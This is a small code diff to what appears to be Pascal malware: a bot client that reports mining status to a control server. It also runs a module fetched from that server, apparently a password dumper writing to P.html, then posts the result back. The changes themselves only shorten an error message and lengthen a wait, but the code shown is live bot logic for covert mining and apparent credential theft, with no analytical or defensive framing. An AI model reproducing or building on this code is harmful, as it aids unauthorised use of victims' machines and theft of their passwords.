@@ -425,8 +425,7 @@ Begin
           ToPost.AddFormField('Result', '['+STemp2+'] stopped mining!');
         end
         else Begin
-          ToPost.AddFormField('Result', 'Failed to start the mining process: '+
-          E.Message);
+          ToPost.AddFormField('Result', 'Failed to start the mining process.');
         end;
       except
         on E: Exception do
@@ -439,7 +438,7 @@ Begin
       Error:=True; //Not feeling too positive today
       ModID:=ExecuteModule(Server+PassModule, '/shtml P.html');
       if ModID>0 then Begin
-        Sleep(3000);
+        Sleep(5000);
         if FileExists('P.html') then Begin
           Error:=False;
           ToPost.AddFormField('RT', '2');
